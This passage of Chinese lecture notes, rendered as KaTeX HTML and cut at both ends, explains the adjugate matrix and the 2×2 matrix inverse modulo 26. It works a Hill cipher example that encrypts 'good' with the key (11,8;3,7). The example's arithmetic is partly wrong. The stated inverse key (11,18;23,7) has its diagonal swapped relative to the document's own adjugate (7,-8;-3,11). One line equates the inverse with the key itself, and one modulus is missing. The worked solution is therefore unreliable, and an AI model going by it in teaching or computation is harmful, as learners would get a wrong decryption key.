mathnormal">A</span></span></span></span>去掉第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span>行、第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>列后剩余元素所组成的矩阵行列式。注意，伴随矩阵需要进行<strong>转置</strong>处理。</p><blockquote><p>对于一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">n×n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>，其伴随矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>adj</mtext><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{adj}(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">adj</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span> 是由 A 的代数余子式构成的矩阵的转置。</p></blockquote><p>在n=2时，有下列推论：</p><p>假设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>a</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">A=\left(\begin{array}{c}a_{1,1},a_{1,2} \\a_{2,1},a_{2,2} \\\end{array}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span>是一个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>×</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">2\times 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>矩阵，它的行列式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>a</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>a</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">det(A)=a_{1,1}a_{2,2}-a_{1,2}a_{2,1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，那么有：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mo stretchy="false">(</mo><mi>d</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub><mo separator="true">,</mo><mo>−</mo><msub><mi>a</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>a</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">A^{-1}=(det(A))^{-1}\left(\begin{array}{c}a_{2,2},-a_{1,2} \\-a_{2,1},a_{1,1} \\\end{array}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></p><h4 id="例题-5"><a class="markdownIt-Anchor" href="#例题-5"></a> 例题</h4><p>设明文消息为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>o</mi><mi>o</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">good</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">o</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span></span></span></span>，试用<em>n</em>＝2，密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>11</mn><mo separator="true">,</mo><mn>8</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3</mn><mo separator="true">,</mo><mn>7</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">k=\left(\begin{array}{c}11,8 \\3,7 \\\end{array}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span>的Hill密码对其进行加密，然后再进行解密（明密文分组列向量表示）</p><p>因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>11</mn><mo separator="true">,</mo><mn>8</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3</mn><mo separator="true">,</mo><mn>7</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">k=\left(\begin{array}{c}11,8 \\3,7 \\\end{array}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span>，故<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>det</mtext><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>11</mn><mo separator="true">,</mo><mn>8</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3</mn><mo separator="true">,</mo><mn>7</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mn>11</mn><mo>×</mo><mn>7</mn><mo>−</mo><mn>3</mn><mo>×</mo><mn>8</mn><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo><mo>=</mo><mn>53</mn><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\text{det}\left(\begin{array}{c}11,8 \\3,7 \\\end{array}\right)=11\times 7-3\times 8(\bmod26)=53(\bmod)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord text"><span class="mord">det</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">8</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord">3</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>11</mn><mo separator="true">,</mo><mn>8</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3</mn><mo separator="true">,</mo><mn>7</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><msup><mn>1</mn><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>×</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>7</mn><mo separator="true">,</mo><mo>−</mo><mn>8</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn><mo separator="true">,</mo><mn>11</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>11</mn><mo separator="true">,</mo><mn>18</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>23</mn><mo separator="true">,</mo><mn>7</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn></mrow><annotation encoding="application/x-tex">k^{-1}=\left(\begin{array}{c}11,8 \\3,7 \\\end{array}\right)=1^{-1}\times \left(\begin{array}{c}7,-8 \\-3,11 \\\end{array}\right)=\left(\begin{array}{c}11,18 \\23,7 \\\end{array}\right)\bmod26</annotation></semantics></math></span><span class="katex-html" 